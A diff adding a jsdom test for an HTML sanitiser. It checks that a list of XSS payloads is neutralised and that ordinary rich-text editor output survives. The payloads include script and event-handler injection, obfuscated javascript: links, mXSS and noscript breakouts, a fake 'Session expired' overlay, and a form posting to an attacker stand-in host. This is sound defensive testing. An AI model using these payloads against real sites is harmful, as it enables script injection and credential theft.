+#!/usr/bin/env node
+// DRAFT (docs/security-plan). jsdom test for the hardened sanitizeHtml: hostile payloads are neutralised AND editor output survives.
+import assert from "node:assert/strict";
+import { JSDOM } from "jsdom";
+const dom = new JSDOM("<!doctype html><body></body>", { url: "http://localhost/" });
+globalThis.window = dom.window; globalThis.document = dom.window.document;
+const { sanitizeHtml, filterStyleAttribute } = await import("../src/lib/sanitizeHtml.js");
+let passed = 0, failed = 0;
+const test = (n, f) => { try { f(); console.log(`  PASS  ${n}`); passed++; } catch (e) { console.log(`  FAIL  ${n}\n        ${e.message}`); failed++; } };
+const hostile = {
+  script: `<p>hi</p><script>alert(1)</script>`, onerror: `<img src=x onerror="alert(1)">`, svg: `<svg onload="alert(1)"><circle r=5></circle></svg>`,
+  jshref: `<a href="javascript:alert(1)">x</a>`, jshrefEnt: `<a href="jav&#x09;ascript:alert(1)">x</a>`, dataHref: `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`,
+  iframe: `<iframe src="https://evil.example/"></iframe>`, srcdoc: `<iframe srcdoc="<script>alert(1)</script>"></iframe>`, obj: `<object data="https://evil.example/x"></object><embed src="https://evil.example/x">`,
+  form: `<form action="https://evil.example/steal"><input name=pw><button>go</button></form>`, styleTag: `<style>body{display:none}</style><p>x</p>`,
+  expr: `<p style="width:expression(alert(1))">x</p>`, overlay: `<p style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;z-index:99999">Session expired</p>`,
+  bgimg: `<p style="background-image:url(https://evil.example/t.gif)">x</p>`, meta: `<meta http-equiv="refresh" content="0;url=https://evil.example">`, base: `<base href="https://evil.example/">`,
+  btn: `<button formaction="https://evil.example">x</button>`, video: `<video src="https://evil.example/v.mp4"></video>`, mxss: `<math><mi><style><img src=x onerror=alert(1)></style></mi></math>`,
+  details: `<details open ontoggle="alert(1)">x</details>`, noscript: `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`,
+};
+for (const [name, html] of Object.entries(hostile)) {
+  test(`neutralises ${name}`, () => {
+    const out = sanitizeHtml(html);
+    const d = new JSDOM(`<body>${out}</body>`).window.document;
+    assert.equal(d.querySelectorAll("script,iframe,object,embed,form,input,button,style,svg,math,video,meta,base,link").length, 0, out);
+    for (const el of d.querySelectorAll("*")) {
+      for (const a of el.attributes) {
+        assert.ok(!/^on/i.test(a.name), `${a.name} in ${out}`);
+        assert.ok(!/javascript:|expression\(|url\(|position\s*:|z-index/i.test(a.value.replace(/[\s\u0000-\u001f]/g, "")) || a.name === "href" && false, `${a.name}=${a.value}`);
+      }
+    }
+  });
+}
+const keep = [
+  `<h2>Title</h2><p style="text-align: center; margin-left: 40px">x</p>`,
+  `<span style="font-size: 18px; font-family: Georgia, serif; color: #ff0000; background-color: #ffff00">x</span>`,
+  `<p><b>b</b><i>i</i><u>u</u><s>s</s>H<sub>2</sub>O x<sup>2</sup></p><ul><li>a</li></ul><ol><li>b</li></ol>`,
+  `<a href="https://example.com/x">l</a>`, `<table><tbody><tr><td>1</td></tr></tbody></table>`,
+  `<img src="https://abc.supabase.co/storage/v1/object/public/learn-media/a.png" alt="a">`,
+];
+keep.forEach((h, i) => test(`preserves editor output #${i + 1}`, () => {
+  const a = new JSDOM(`<body>${h}</body>`).window.document.body, b = new JSDOM(`<body>${sanitizeHtml(h)}</body>`).window.document.body;
+  const norm = (n) => [...n.querySelectorAll("*")].map((e) => e.tagName + "|" + [...e.attributes].map((x) => x.name + "=" + x.value.replace(/;\s*$/, "").replace(/\s+/g, " ")).filter((s) => !s.startsWith("rel=")).sort().join(","));
+  assert.deepEqual(norm(b), norm(a));
+}));
+test("target attribute is dropped (same as baseline DOMPurify default)", () => assert.ok(!/target=/.test(sanitizeHtml(`<a href="https://e.com" target="_blank">x</a>`))));
+test("allowedImageHosts drops foreign images, keeps listed", () => {
+  const o = sanitizeHtml(`<img src="https://evil.example/a.png"><img src="https://abc.supabase.co/a.png">`, { allowedImageHosts: ["abc.supabase.co"] });
+  assert.ok(!o.includes("evil.example")); assert.ok(o.includes("abc.supabase.co"));
+});
+test("filterStyleAttribute keeps benign, drops risky", () => assert.equal(filterStyleAttribute("color:red; position:fixed; width:url(x)"), "color:red"));
+console.log(`\n${passed} passed, ${failed} failed`); process.exit(failed ? 1 : 0);
